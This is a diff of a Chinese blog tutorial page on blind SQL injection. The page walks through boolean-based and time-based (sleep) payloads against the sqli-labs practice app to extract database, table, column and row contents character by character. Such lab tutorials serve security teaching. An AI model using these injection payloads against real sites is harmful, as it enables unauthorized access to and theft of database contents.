@@ -95,7 +95,7 @@
 </head>
 
 
-<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+<body class="main-center theme-black# 主题颜色 theme-black theme-blue theme-green theme-purple" itemscope itemtype="http://schema.org/WebPage">
   <header class="header" itemscope itemtype="http://schema.org/WPHeader">
   <div class="slimContent">
     <div class="navbar-header">
@@ -427,6 +427,7 @@
 </blockquote>
 <p><strong>python代码实现如下：</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#Author:Mr.zhang</span></span><br><span class="line"><span class="comment">#Data:2020-1-9</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BinarySearch</span><span class="params">(list1, num)</span>:</span></span><br><span class="line"></span><br><span class="line">    min = <span class="number">0</span>               <span class="comment"># 最小的下标</span></span><br><span class="line">    max = len(list1) - <span class="number">1</span>  <span class="comment"># 最大的下标</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        mid = (max + min) // <span class="number">2</span> <span class="comment"># 中间的下标每次向下取整</span></span><br><span class="line">        <span class="keyword">if</span> num &gt; list1[mid] :</span><br><span class="line">            min = mid + <span class="number">1</span>  <span class="comment"># 小于需要的猜的数，则将最小下标变为中间的，又因为中间的已经猜过，所以要加1</span></span><br><span class="line">        <span class="keyword">elif</span> num == list1[mid] :</span><br><span class="line">            print(<span class="string">"找到数据"</span>)</span><br><span class="line">            print(<span class="string">"一共查找%d次"</span>%i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            max = mid - <span class="number">1</span>  <span class="comment"># 大于需要的猜的数，则将最大下标变为中间的，又因为中间的已经猜过，所以要减1</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    list1 = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>)]</span><br><span class="line">    num = <span class="number">83</span></span><br><span class="line">    BinarySearch(list1, num)</span><br></pre></td></tr></table></figure>
+
 <h2 id="3-2-布尔盲注"><a href="#3-2-布尔盲注" class="headerlink" title="3.2 布尔盲注"></a>3.2 布尔盲注</h2><h3 id="3-2-1-常用函数详解"><a href="#3-2-1-常用函数详解" class="headerlink" title="3.2.1 常用函数详解"></a>3.2.1 常用函数详解</h3><p><strong>mid()函数</strong></p>
 <p><strong>作用：</strong>截取字符串的一部分</p>
 <p><strong>使用格式：</strong>mid(column_name,start,length)</p>
@@ -453,58 +454,71 @@
 <p><strong>使用格式:</strong> regexp ‘表达式’</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200113092421664.png" alt="image-20200113092421664"></p>
 <p>如果符合正则匹配，则显示前面sql语句执行的结果；反之则会显示<figure class="highlight plain"><figcaption><span>set```.通常使用```limit 0,1```只显示第一条数据．</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20200113100425526](高级注入（二）/00831rSTgy1gcnfv5ty9lj31u808w764.png)</span><br><span class="line"></span><br><span class="line">**like**</span><br><span class="line"></span><br><span class="line">**作用：** 和regexp正则注入类似</span><br><span class="line"></span><br><span class="line">![image-20200113100628303](高级注入（二）/image-20200113100628303.png)</span><br><span class="line">![image-20200113100708046](高级注入（二）/image-20200113100708046.png)</span><br><span class="line"></span><br><span class="line">### 3.2.2 猜解库名</span><br><span class="line"></span><br><span class="line">​	根据注入点判断测试，发现存在布尔盲注，进行库名拆解。利用sqlilab的实验8进行相应实验测试，我们发现布尔盲注在正常请求页面的情况下，页面显示&quot;You are in...&quot;字符串；查询数据错误时，页面没有任何数据信息显示，以此为判断依据进行判断。</span><br><span class="line"></span><br><span class="line">**第一步：判断数据库库名的长度**</span><br><span class="line"></span><br><span class="line">`http://192.168.55.107:8080/Less-8/?id=1&apos; and  length(database())&gt;7--+`</span><br><span class="line"></span><br><span class="line">测试库名大于7时，页面数据正常回显，如下图所示：</span><br><span class="line"></span><br><span class="line">![image-20200113104930395](高级注入（二）/image-20200113104930395.png)</span><br><span class="line"></span><br><span class="line">测试库名大于8时，页面数据没有没有回显，如下图所示：</span><br><span class="line"></span><br><span class="line">![image-20200113105111766](高级注入（二）/image-20200113105111766.png)</span><br><span class="line"></span><br><span class="line">由此可判断，数据存在一个临界值，这个值即为当前数据库库名的长度，长度为8</span><br><span class="line"></span><br><span class="line">**第二步：判断数据库的库名**</span><br><span class="line"></span><br><span class="line">`http://192.168.55.107:8080/Less-8/?id=1&apos; and  ascii(substr(database(),1,1))&gt;114--+`</span><br><span class="line"></span><br><span class="line">由第一步已知当前数据库的库名长度为8，判断库名的第一位的ascii的值进行比较，当测试值为114时，当前页面数据正常回显，如下图所示:</span><br><span class="line"></span><br><span class="line">![image-20200113110947331](高级注入（二）/image-20200113110947331.png)</span><br><span class="line"></span><br><span class="line">当测试值为115时，当前页面数据回显结果为空，如下图所示：</span><br><span class="line"></span><br><span class="line">![image-20200113111046067](高级注入（二）/image-20200113111046067.png)</span><br><span class="line"></span><br><span class="line">由此可判断，数据存在一个临界值，这个值即为当前库名第一位的ascii值为115，对应字符为s</span><br><span class="line"></span><br><span class="line">以此类推判断当前库名的后续字符值，获取当前数据库的库名。</span><br><span class="line"></span><br><span class="line">### 3.2.3 猜解表名</span><br><span class="line"></span><br><span class="line">**第一步:拆解当前数据库中表的数量**</span><br></pre></td></tr></table></figure></p>
-<p><a href="http://192.168.55.106:8080/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://192.168.55.106:8080/Less-8/?id=1&#39;</a> and (select count(table_name) from information_schema.tables where table_schema=’security’) &gt;3–+<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">由前序步骤可知，当前数据库的库名为&quot;security&quot;,判断当前库下表的数量，当带入值为3时，当前页面数据正常回显，如下图所示：</span><br><span class="line"></span><br><span class="line">![image-20200115133524556](高级注入（二）/image-20200115133524556.png)</span><br><span class="line"></span><br><span class="line">当测试值为4时，当前页面数据回显结果为空，如下图所示：</span><br><span class="line"></span><br><span class="line">![image-20200115133656165](高级注入（二）/00831rSTgy1gcnfvcykctj327y0ioq6t.png)</span><br><span class="line"></span><br><span class="line">由此可判断，数据存在一个临界值，这个值即为当前库下表的数量为4。</span><br><span class="line"></span><br><span class="line">**第二步:拆解当前数据库中其中一个表的表名**</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">http://192.168.55.106:8080/Less-8/?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)) &gt; 100--+</span><br></pre></td></tr></table></figure></p>
+<p><a href="http://192.168.55.106:8080/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://192.168.55.106:8080/Less-8/?id=1&#39;</a> and (select count(table_name) from information_schema.tables where table_schema=’security’) &gt;3–+</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">由前序步骤可知，当前数据库的库名为&quot;security&quot;,判断当前库下表的数量，当带入值为3时，当前页面数据正常回显，如下图所示：</span><br><span class="line"></span><br><span class="line">![image-20200115133524556](高级注入（二）/image-20200115133524556.png)</span><br><span class="line"></span><br><span class="line">当测试值为4时，当前页面数据回显结果为空，如下图所示：</span><br><span class="line"></span><br><span class="line">![image-20200115133656165](高级注入（二）/00831rSTgy1gcnfvcykctj327y0ioq6t.png)</span><br><span class="line"></span><br><span class="line">由此可判断，数据存在一个临界值，这个值即为当前库下表的数量为4。</span><br><span class="line"></span><br><span class="line">**第二步:拆解当前数据库中其中一个表的表名**</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">http://192.168.55.106:8080/Less-8/?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)) &gt; 100--+</span><br></pre></td></tr></table></figure>
+
 <p>由前序步骤可知，当前数据库的库名为”security”,当前库中表的数量为4，判断当前库中第一表表名的第一字母，当带入值为100时，当前页面数据正常回显，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200115134828024.png" alt="image-20200115134828024"></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.106:8080/Less-8/?id=1' and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">101</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
 <p>当带入值为101时，当前页面数据回显为空，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200115134945393.png" alt="image-20200115134945393"></p>
 <p>由此可判断，数据存在一个临界值，这个值即为当前表名第一位的ascii值为101，对应字符为e</p>
 <p>以此类推判断当前表名的后续字符值，获取当前数据库中的第一个表名。</p>
 <h3 id="3-2-4-猜解字段名"><a href="#3-2-4-猜解字段名" class="headerlink" title="3.2.4 猜解字段名"></a>3.2.4 猜解字段名</h3><p><strong>第一步:拆解表中字段的数量</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.106:8080/Less-8/?id=1&apos; and (select count(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;emails&apos;) &gt; 1--+</span><br></pre></td></tr></table></figure>
+
 <p>由前序步骤可知，当前数据库的库名为”security”、第一个表名为”emails”,判断当前库下表的数量。</p>
 <p>当带入值为1时，当前页面数据正常回显，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/00831rSTgy1gcnfuxq7y8j327y0hstcn.png" alt="image-20200115135736800"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.106:8080/Less-8/?id=1&apos; and (select count(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;emails&apos;) &gt; 2--+</span><br></pre></td></tr></table></figure>
+
 <p>当带入值为2时，当前页面数据回显为空，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200115135901211.png" alt="image-20200115135901211"></p>
 <p>由此可判断，数据存在一个临界值，这个值即为当前emails表中字段的数量为2。</p>
 <p><strong>第二步:拆解表中字段的第一个字段的名称</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.106:8080/Less-8/?id=1&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;emails&apos; limit 0,1),1,1))&gt; 104--+</span><br></pre></td></tr></table></figure>
+
 <p>由前序步骤可知，当前数据库的库名为”security”、第一个表名为”emails”,判断当前表中第一个字段中第一个字母为。</p>
 <p>当带入值为104时，当前页面数据正常回显，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/00831rSTgy1gcnfv27xf3j327y0q8ng6.png" alt="image-20200115142510718"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.106:8080/Less-8/?id=1&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;emails&apos; limit 0,1),1,1))&gt; 105--+</span><br></pre></td></tr></table></figure>
+
 <p>当带入值为105时，当前页面数据回显为空，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200115145329352.png" alt="image-20200115145329352"></p>
 <p>由此可判断，数据存在一个临界值，这个值即为当前字段名第一位的ascii值为105，对应字符为i</p>
 <p>以此类推判断当前字段名的后续字符值，获取当前表中的第一个字段名称。</p>
 <h3 id="3-2-5-猜解字段内容"><a href="#3-2-5-猜解字段内容" class="headerlink" title="3.2.5 猜解字段内容"></a>3.2.5 猜解字段内容</h3><p><strong>第一步:拆解字段内容数量</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.106:8080/Less-8/?id=1' and (<span class="keyword">select</span> <span class="keyword">count</span>(<span class="keyword">id</span>) <span class="keyword">from</span> emails) &gt; <span class="number">7</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
 <p>获取emails表中，id字段的内容数量</p>
 <p>当带入值为7时，页面数据正常回显，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200115152625643.png" alt="image-20200115152625643"></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.106:8080/Less-8/?id=1' and (<span class="keyword">select</span> <span class="keyword">count</span>(<span class="keyword">id</span>) <span class="keyword">from</span> emails) &gt; <span class="number">8</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
 <p>当带入值为8时，页面数据回显结果为空，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200115152729849.png" alt="image-20200115152729849"></p>
 <p>由此可判断，数据存在一个临界值，这个值即为当前字段内容数量8</p>
 <p><strong>第二步:拆解字段内容长度</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.106:8080/Less-8/?id=1&apos; and length((select id from emails limit 0,1))&gt;0--+</span><br></pre></td></tr></table></figure>
+
 <p>获取id字段中，第一个字段内容的长度</p>
 <p>当带入值为0时，页面数据正常回显，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/00831rSTgy1gcnfvb5wchj327y0oenfn.png" alt="image-20200115154939801"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.106:8080/Less-8/?id=1&apos; and length((select id from emails limit 0,1))&gt;1--+</span><br></pre></td></tr></table></figure>
+
 <p>当带入值为1时，页面数据回显结果为空，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200115155032310.png" alt="image-20200115155032310"></p>
 <p>由此可判断，数据存在一个临界值，这个值即为当前字段长度值1。</p>
 <p>按照此步骤可以一次判断其他字段的长度。</p>
 <p><strong>第三步:拆解字段内容</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.106:8080/Less-8/?id=1&apos; and ascii(substr((select id from emails limit 0,1),1,1)) &gt;48--+</span><br></pre></td></tr></table></figure>
+
 <p>获取字段中第一位的字段内容的ascii码值</p>
 <p>当带入值为48时，页面数据正常回显，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200115154205101.png" alt="image-20200115154205101"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.106:8080/Less-8/?id=1&apos; and ascii(substr((select id from emails limit 0,1),1,1)) &gt;49--+</span><br></pre></td></tr></table></figure>
+
 <p>当带入值为49时，页面数据回显为空，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200115154245368.png" alt="image-20200115154245368"></p>
 <p>由此可判断，数据存在一个临界值，这个值即为当前id字段第一个内容第一位ascii码值为49，即为数字1</p>
@@ -520,17 +534,21 @@
 <p><img src="/2020/03/09/高级注入（二）/00831rSTgy1gcnfvcfg3qj31u20okjub.png" alt="image-20200115162009405"></p>
 <h3 id="3-3-2-拆解库名"><a href="#3-3-2-拆解库名" class="headerlink" title="3.3.2 拆解库名"></a>3.3.2 拆解库名</h3><p><strong>第一步：猜解库名长度</strong></p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.102:8080/Less-9/?id=1' and if(length(database())&gt;7,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p>当带入值为7时，页面响应时间增长，响应时间为3s,如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200120161504245.png" alt="image-20200120161504245"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.102:8080/Less-9/?id=1&apos; and if(length(database())&gt;8,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p>当带入值为8时，页面响应时间不变，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200120161602087.png" alt="image-20200120161602087"></p>
 <p>由此可判断当前数据库库名长度为8</p>
 <p><strong>第二步：猜解库名</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.102:8080/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&gt;114,sleep(3),1)- -+</span><br></pre></td></tr></table></figure>
+
 <p>当带入的值为114时，页面响应时间为3s，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/00831rSTgy1gcnfuy1ghsj327y0hstcn.png" alt="image-20200120162420404"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.102:8080/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&gt;115,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p>当带入的值为115时，页面响应时间正常 ，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/00831rSTgy1gcnfv9cdbej31t10u0tte.png" alt="image-20200120162535680"></p>
 <p>由此可判断库名的第一个字母的ascii值为115，即s</p>
@@ -538,22 +556,27 @@
 <p>最终得到库名为security</p>
 <h3 id="3-3-3-猜解表名"><a href="#3-3-3-猜解表名" class="headerlink" title="3.3.3 猜解表名"></a>3.3.3 猜解表名</h3><p><strong>第一步：猜解表名数量</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.102:8080/Less-9/?id=1&apos; and if((select count(table_name) from information_schema.tables where table_schema=&apos;security&apos;)&gt;3,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p>当带入的值为3时，页面响应时间为3s，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/00831rSTgy1gcnfuz238wj31su0u0aun.png" alt="image-20200120164400523"></p>
 <p>当带入的值为4时，页面响应时间正常 ，如下图所示：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.102:8080/Less-9/?id=1&apos; and if((select count(table_name) from information_schema.tables where table_schema=&apos;security&apos;)&gt;4,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p><img src="/2020/03/09/高级注入（二）/image-20200120164446906.png" alt="image-20200120164446906"></p>
 <p>由此可判断，当前库中表的数量为4</p>
 <p><strong>第二步：猜解表的长度</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.102:8080/Less-9/?id=1&apos; and if(length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1))&gt;5,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p>当带入的值为5时，页面响应时间为3s，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200120164914497.png" alt="image-20200120164914497"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.102:8080/Less-9/?id=1&apos; and if(length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1))&gt;6,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p>当带入的值为6时，页面响应时间正常，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200120165029898.png" alt="image-20200120165029898"></p>
 <p>由此可判断，当前库中第一个表的表名长度为6</p>
 <p><strong>第三步：猜解表名</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.102:8080/Less-9/?id=1&apos; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))&gt;100,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p>当带入的值为100时，页面响应时间为3s，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/00831rSTgy1gcnfuzy9p1j31sj0u0qnj.png" alt="image-20200120170443238"></p>
 <p>当带入的值为101时，页面响应时间正常，如下图所示：</p>
@@ -563,54 +586,66 @@
 <p>库中的四个表名依次为：emails、referers、uagents、users</p>
 <h3 id="3-3-4-猜解字段名"><a href="#3-3-4-猜解字段名" class="headerlink" title="3.3.4 猜解字段名"></a>3.3.4 猜解字段名</h3><p><strong>第一步：猜解users表中字段数量</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.104:8080/Less-9/?id=1&apos; and if((select COUNT(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;)&gt;2,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p>带入值为2时，页面响应时间为3s，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200121111207067.png" alt="image-20200121111207067"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.104:8080/Less-9/?id=1&apos; and if((select COUNT(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;)&gt;3,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p>带入值为3时，页面响应时间正常，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200121111422842.png" alt="image-20200121111422842"></p>
 <p>由此可判断，users表中有3个字段</p>
 <p><strong>第二步：判断字段名称长度</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.104:8080/Less-9/?id=1&apos; and if(length((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1))&gt;1,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p>当带入值为1时,页面响应时间为3s，如下图所示:</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200121111905166.png" alt="image-20200121111905166"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.104:8080/Less-9/?id=1&apos; and if(length((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1))&gt;2,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p>但带入的值为2时，页面的响应时间正常，如下图所示：</p>
 <p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gcnfv0w9fdj31u00u0avt.jpg" alt="image-20200121112024864"></p>
 <p>由此可判断，当前字段名长度为2</p>
 <p><strong>第三步：判断字段名</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.100:8080/Less-9/?id=1&apos; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),1,1))&gt;104,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p>当带入的值为104时，页面的响应时间为3s，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/00831rSTgy1gcnfv58gu9j31rv0u0nji.png" alt="image-20200121140259834"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.55.100:8080/Less-9/?id=1&apos; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),1,1))&gt;105,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p>当带入的值为105时，页面的响应时间正常，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/00831rSTgy1gcnfv6jkfoj31vu0u01fn.png" alt="image-20200121140628583"></p>
 <p>由此可判断，当前字段的第一个字母的ascii值为105，即为i</p>
 <p>以此方法循环判断当前表中的字段名称依次为：id、email_id</p>
 <h3 id="3-3-5-猜解字段内容"><a href="#3-3-5-猜解字段内容" class="headerlink" title="3.3.5 猜解字段内容"></a>3.3.5 猜解字段内容</h3><p><strong>第一步:拆解字段内容数量</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.220:8080/Less-9/?id=1' and if((<span class="keyword">select</span> <span class="keyword">count</span>(<span class="keyword">id</span>) <span class="keyword">from</span> emails) &gt; <span class="number">7</span>,<span class="keyword">sleep</span>(<span class="number">3</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
 <p>获取emails表中，id字段的内容数量</p>
 <p>当带入值为7时，页面回显时间明显变长，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200210134818728.png" alt="image-20200210134818728"></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.220:8080/Less-9/?id=1' and if((<span class="keyword">select</span> <span class="keyword">count</span>(<span class="keyword">id</span>) <span class="keyword">from</span> emails) &gt; <span class="number">8</span>,<span class="keyword">sleep</span>(<span class="number">3</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
 <p>当带入值为8时，页面数据回显时间正常，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200210135002727.png" alt="image-20200210135002727"></p>
 <p>由此可判断，数据存在一个临界值，这个值即为当前字段内容数量8</p>
 <p><strong>第二步:拆解字段内容长度</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.220:8080/Less-9/?id=1&apos; and if(length((select id from emails limit 0,1))&gt;0,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p>获取id字段中，第一个字段内容的长度</p>
 <p>当带入值为0时，页面回显时间明显变长，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/00831rSTgy1gcnfv71m85j31u20u01e7.png" alt="image-20200210135249285"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.220:8080/Less-9/?id=1&apos; and if(length((select id from emails limit 0,1))&gt;1,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
+
 <p>当带入值为1时，页面回显时间正常，如下图所示：</p>
 <p><img src="/2020/03/09/高级注入（二）/image-20200210135402577.png" alt="image-20200210135402577"></p>
 <p>由此可判断，数据存在一个临界值，这个值即为当前字段长度值1。</p>
